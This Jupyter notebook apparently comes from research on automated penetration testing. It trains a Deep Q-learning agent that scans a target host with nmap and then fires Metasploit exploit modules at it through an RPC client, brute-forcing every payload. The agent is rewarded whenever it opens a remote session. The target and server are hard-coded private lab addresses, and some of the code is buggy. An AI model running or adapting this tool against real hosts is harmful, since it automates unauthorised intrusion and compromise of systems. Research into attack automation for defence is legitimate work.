{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "5f4b341f",
   "metadata": {},
   "source": [
    "# Deep Q-learning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "49cfb273",
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "import gym\n",
    "import tensorflow as tf\n",
    "from tensorflow import keras\n",
    "from tensorflow.keras.models import Sequential\n",
    "from tensorflow.keras.layers import Dense, Activation\n",
    "from tensorflow.keras.optimizers import Adam\n",
    "from tensorflow.keras.metrics import mean_squared_error\n",
    "\n",
    "from pymetasploit3.msfrpc import *\n",
    "import nmap3\n",
    "import inspect\n",
    "import nmap3\n",
    "import lxml\n",
    "import json\n",
    "from bs4 import BeautifulSoup\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "import random\n",
    "import re\n",
    "import time\n",
    "from matplotlib import pyplot as plt\n",
    "import sys"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a32c934a",
   "metadata": {},
   "outputs": [],
   "source": [
    "class DQNAgent:\n",
    "    def __init__(self, state_size, action_size):\n",
    "        self.n_actions = action_size\n",
    "        # we define some parameters and hyperparameters:\n",
    "        # \"lr\" : learning rate\n",
    "        # \"gamma\": discounted factor\n",
    "        # \"exploration_proba_decay\": decay of the exploration probability\n",
    "        # \"batch_size\": size of experiences we sample to train the DNN\n",
    "        self.lr = 0.001\n",
    "        self.gamma = 0.99\n",
    "        self.exploration_proba = 0.8\n",
    "        self.exploration_proba_decay = 0.005\n",
    "        self.batch_size = 32\n",
    "        \n",
    "        # We define our memory buffer where we will store our experiences\n",
    "        # We stores only the 2000 last time steps\n",
    "        self.memory_buffer= list()\n",
    "        self.max_memory_buffer = 2000\n",
    "        \n",
    "        # We creaate our model having to hidden layers of 24 units (neurones)\n",
    "        # The first layer has the same size as a state size\n",
    "        # The last layer has the size of actions space\n",
    "        self.model = Sequential([\n",
    "            Dense(units=24,input_dim=state_size, activation = 'relu'),\n",
    "            Dense(units=24,activation = 'relu'),\n",
    "            Dense(units=action_size, activation = 'linear')\n",
    "        ])\n",
    "        self.model.compile(loss=\"mse\",\n",
    "                      optimizer = Adam(lr=self.lr))\n",
    "        \n",
    "    # The agent computes the action to perform given a state \n",
    "    def compute_action(self, current_state):\n",
    "        # We sample a variable uniformly over [0,1]\n",
    "        # if the variable is less than the exploration probability\n",
    "        #     we choose an action randomly\n",
    "        # else\n",
    "        #     we forward the state through the DNN and choose the action \n",
    "        #     with the highest Q-value.\n",
    "        if np.random.uniform(0,1) < self.exploration_proba:\n",
    "            return np.random.choice(range(self.n_actions))\n",
    "        q_values = self.model.predict(current_state)[0]\n",
    "        return np.argmax(q_values)\n",
    "\n",
    "    # when an episode is finished, we update the exploration probability using \n",
    "    # espilon greedy algorithm\n",
    "    def update_exploration_probability(self):\n",
    "        self.exploration_proba = self.exploration_proba * np.exp(-self.exploration_proba_decay)\n",
    "        print(self.exploration_proba)\n",
    "    \n",
    "    # At each time step, we store the corresponding experience\n",
    "    def store_episode(self,current_state, action, reward, done):\n",
    "        #We use a dictionnary to store them\n",
    "        self.memory_buffer.append({\n",
    "            \"current_state\":current_state,\n",
    "            \"action\":action,\n",
    "            \"reward\":reward,\n",
    "            \"done\" :done\n",
    "        })\n",
    "        # If the size of memory buffer exceeds its maximum, we remove the oldest experience\n",
    "        if len(self.memory_buffer) > self.max_memory_buffer:\n",
    "            self.memory_buffer.pop(0)\n",
    "    \n",
    "\n",
    "    # At the end of each episode, we train our model\n",
    "    def train(self, batch_size):\n",
    "        # We shuffle the memory buffer and select a batch size of experiences\n",
    "        np.random.shuffle(self.memory_buffer)\n",
    "        batch_sample = self.memory_buffer[0:self.batch_size]\n",
    "        \n",
    "        # We iterate over the selected experiences\n",
    "        for experience in batch_sample:\n",
    "            # We compute the Q-values of S_t\n",
    "            q_current_state = self.model.predict(experience[\"current_state\"])\n",
    "            # We compute the Q-target using Bellman optimality equation\n",
    "            q_target = experience[\"reward\"]\n",
    "            q_current_state[0][experience[\"action\"]] = q_target\n",
    "            # train the model\n",
    "            self.model.fit(experience[\"current_state\"], q_current_state, verbose=0)\n",
    "    \n",
    "    def load(self, name):\n",
    "        self.model.load_weights(name)\n",
    "\n",
    "    def save(self, name):\n",
    "        self.model.save_weights(name)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6d6362b3",
   "metadata": {},
   "source": [
    "# Environment"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2a3518af",
   "metadata": {},
   "outputs": [],
   "source": [
    "def state_loading(state):\n",
    "    if state == \"end\":\n",
    "        return state\n",
    "    state_in_string = \"\"\n",
    "    state_in_string = str(state[0]) + ' ' + str(state[2]) + ' ' +  str(state[3])\n",
    "    filted_state = state_in_string.replace('None', '')\n",
    "    return filted_state\n",
    "\n",
    "def load_all_exploit():\n",
    "    new_module_list = []\n",
    "    for x in client.modules.exploits:\n",
    "        module = 'exploit/' + x\n",
    "        new_module_list.append(module)\n",
    "    return new_module_list\n",
    "\n",
    "def load_all_auxiliary():\n",
    "    new_module_list = []\n",
    "    for x in client.modules.auxiliary:\n",
    "        module = 'auxiliary/' + x\n",
    "        new_module_list.append(module)\n",
    "    return new_module_list\n",
    "\n",
    "# search target service return with a service list\n",
    "\n",
    "def load_all_auxiliary():\n",
    "    new_module_list = []\n",
    "    for x in client.modules.auxiliary:\n",
    "        module = 'auxiliary/' + x\n",
    "        new_module_list.append(module)\n",
    "    return new_module_list\n",
    "\n",
    "# search target service return with a service list\n",
    "def search_service(ip):\n",
    "    nmap = nmap3.Nmap()\n",
    "    version_result = nmap.nmap_version_detection(ip)\n",
    "    result = []\n",
    "    for x in version_result[target][\"ports\"]:\n",
    "        result.append([x.get('service').get('name'), x.get('portid'), x.get('service').get('product'), x.get('service').get('version')])\n",
    "    return result\n",
    "\n",
    "# kill all session, destroy console and set state to init\n",
    "def reset():\n",
    "    global console_cid\n",
    "    client.consoles.console(console_cid).write('sessions -K')\n",
    "    state = 'init'\n",
    "\n",
    "#check the action seccss create a session\n",
    "def check_success():\n",
    "    success = False\n",
    "    session = client.sessions.list.keys()\n",
    "    if len(session) != 0:\n",
    "        success = True\n",
    "        client.consoles.console(console_cid).write('sessions -K')\n",
    "    return success\n",
    "\n",
    "# fill parameter of the exploit module\n",
    "def fill_requirement(exploit):\n",
    "    filled_exploit = exploit\n",
    "    for x in exploit.missing_required:\n",
    "        if x == 'RHOSTS':\n",
    "            filled_exploit['RHOSTS'] = target\n",
    "        if x == 'RHOST':\n",
    "            filled_exploit['RHOST'] = target\n",
    "    return filled_exploit\n",
    "\n",
    "# execute the exploit module with brute force the payload\n",
    "def perform_action(action):\n",
    "    action_list = load_all_exploit()\n",
    "    choose = action_list[action]\n",
    "    print (choose)\n",
    "    if 'exploit' in choose:\n",
    "        exploit = client.modules.use('exploit', choose)\n",
    "        filled_exploit = fill_requirement(exploit)\n",
    "        for x in filled_exploit.targetpayloads():\n",
    "            try:\n",
    "                filled_exploit.execute(payload=x)\n",
    "            except Exception:\n",
    "                print ('Payload Exception:', Exception)\n",
    "                pass\n",
    "    if 'auxiliary' in choose:\n",
    "        exploit = client.modules.use('auxiliary', choose)\n",
    "        exploit.execute()\n",
    "        \n",
    "# load all the possible action (modules) about the service        \n",
    "def load_action_set(service):\n",
    "    global console_cid\n",
    "    pattern = re.compile(r'\\bexploit\\b/[\\w]{1,80}/[\\w]{1,80}/[\\w]{1,80}', flags=re.I | re.X)\n",
    "    #pattern = re.compile(r'(\\bauxiliary\\b/[\\w]{1,80}/[\\w]{1,80}/[\\w]{1,80}|\\bexploit\\b/[\\w]{1,80}/[\\w]{1,80}/[\\w]{1,80})', flags=re.I | re.X)\n",
    "    result = []\n",
    "    search_vairable = service[2]\n",
    "    if search_vairable == None:\n",
    "        search_vairable = service[0]\n",
    "    if '/' in search_vairable:\n",
    "        multi_vairable = search_vairable.split(\"/\")\n",
    "        for x in multi_vairable:\n",
    "            command = 'search ' + x\n",
    "            client.consoles.console(console_cid).write(command)\n",
    "            x = client.consoles.console(console_cid).read()\n",
    "            result = result + pattern.findall(x['data'])\n",
    "    else:\n",
    "        command = 'search ' + search_vairable\n",
    "        client.consoles.console(console_cid).write(command)\n",
    "        x = client.consoles.console(console_cid).read()\n",
    "        result = pattern.findall(x['data'])\n",
    "    return result\n",
    "\n",
    "def encode_state(states):\n",
    "    encoded = []\n",
    "    for x in states:\n",
    "        encoded.append(hash(x))\n",
    "    return encoded"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "035e1bb9",
   "metadata": {},
   "outputs": [],
   "source": [
    "client = MsfRpcClient('1234', port=55553, server='172.18.0.7')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a91777bc",
   "metadata": {},
   "outputs": [],
   "source": [
    "target = '172.18.0.9'\n",
    "all_action = load_all_exploit()# + load_all_auxiliary()\n",
    "console_cid = client.consoles.console().cid\n",
    "\n",
    "env_state = 'init'\n",
    "env_current_action_set = []\n",
    "env_all_target_service = []\n",
    "env_action_set = []\n",
    "env_reward = 0\n",
    "env_chech_exploit = False\n",
    "\n",
    "def env_step(action):\n",
    "    global env_state\n",
    "    global env_action_set\n",
    "    global env_all_target_service\n",
    "    global env_reward\n",
    "    global target\n",
    "    \n",
    "    Done = False\n",
    "    state_count = 0\n",
    "    track_state = \"\"\n",
    "    \n",
    "    if env_state == 'init':\n",
    "        env_all_target_service = search_service(target)\n",
    "        if len(env_all_target_service) > 1:\n",
    "            env_state = env_all_target_service.pop(np.random.choice(len(env_all_target_service)-1))\n",
    "            print(env_state)\n",
    "        elif len(env_all_target_service) == 1:\n",
    "            env_state = env_all_target_service.pop()\n",
    "        else:\n",
    "            env_state = [hash(\"end\")]\n",
    "\n",
    "    if action != '':\n",
    "        perform_action(action)\n",
    "        if action in env_action_set:\n",
    "            env_action_set.remove(action)\n",
    "\n",
    "    chech_exploit = check_success()\n",
    "        \n",
    "    # reward function\n",
    "    if chech_exploit == True:\n",
    "        Done = True\n",
    "        env_reward = 100\n",
    "        print ('Exploited: ', state_loading(env_state), action, env_reward)\n",
    "        if len(env_all_target_service) > 1:\n",
    "            env_state = env_all_target_service.pop(np.random.choice(len(env_all_target_service)-1))\n",
    "            print(env_state)\n",
    "        elif len(env_all_target_service) == 1:\n",
    "            env_state = env_all_target_service.pop()\n",
    "        else:\n",
    "            env_state = 'end'\n",
    "        chech_exploit = False\n",
    "    elif chech_exploit == False:\n",
    "        env_reward = -10\n",
    "    else:\n",
    "        env_reward = 0\n",
    "        \n",
    "    if track_state == state_loading(env_state):\n",
    "        if statecount > 10:\n",
    "            if len(env_all_target_service) > 1:\n",
    "                env_state = env_all_target_service.pop(np.random.choice(len(env_all_target_service)-1))\n",
    "                env_action_set = load_action_set(env_state)\n",
    "            elif len(env_all_target_service) == 1:\n",
    "                env_state = env_all_target_service.pop()\n",
    "            else:\n",
    "                env_state = 'end'\n",
    "        else:\n",
    "            state_count += 1\n",
    "    else:\n",
    "        track_state = state_loading(env_state)\n",
    "        \n",
    "    return env_reward, Done, encode_state(env_state)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4608d244",
   "metadata": {},
   "outputs": [],
   "source": [
    "acumulate_reward_list = []\n",
    "\n",
    "def RunRL():\n",
    "    state_size = 4\n",
    "    action_size = len(load_all_exploit())\n",
    "    agent = DQNAgent(state_size, action_size)\n",
    "    agent.load(\"DeepQmodel\")\n",
    "    state = [hash(\"Empty State\"),hash(\"Empty State\") , hash(\"Empty State\"), hash(\"Empty State\")]\n",
    "    reward = 0\n",
    "    done = False\n",
    "    state = np.array([state])\n",
    "    batch_size = 32\n",
    "    \n",
    "    global acumulate_reward_list\n",
    "    rewards = 0\n",
    "    total_steps = 0\n",
    "    \n",
    "    reset()\n",
    "    \n",
    "    try:\n",
    "        while total_steps < 300:\n",
    "            total_steps = total_steps + 1\n",
    "            action = agent.compute_action(state)\n",
    "        \n",
    "            agent.store_episode(state, action, reward, done)\n",
    "        \n",
    "            reward, done, state = env_step(action)\n",
    "        \n",
    "            state = np.array([state])\n",
    "        \n",
    "            rewards = rewards + reward\n",
    "            acumulate_reward_list.append(rewards)\n",
    "        \n",
    "            if done:\n",
    "                agent.update_exploration_probability()\n",
    "                agent.save(\"DeepQmodel\")\n",
    "                print (\"Save\")\n",
    "            \n",
    "            if total_steps >= batch_size:\n",
    "                agent.train(batch_size)\n",
    "                agent.save(\"DeepQmodel\")\n",
    "        \n",
    "            if hash(\"end\") in state:\n",
    "                print('Finish of Testing')\n",
    "                break\n",
    "        return\n",
    "    \n",
    "    except:\n",
    "        agent.save(\"DeepQmodel\")\n",
    "        e = sys.exc_info()[0]\n",
    "        print(\"Error: %s\" % e )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "302d00a3",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "RunRL()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cc676bf2",
   "metadata": {},
   "outputs": [],
   "source": [
    "plt.plot(acumulate_reward_list)\n",
    "plt.xlabel(\"step\")\n",
    "plt.ylabel(\"reward\")\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a78d80ea",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
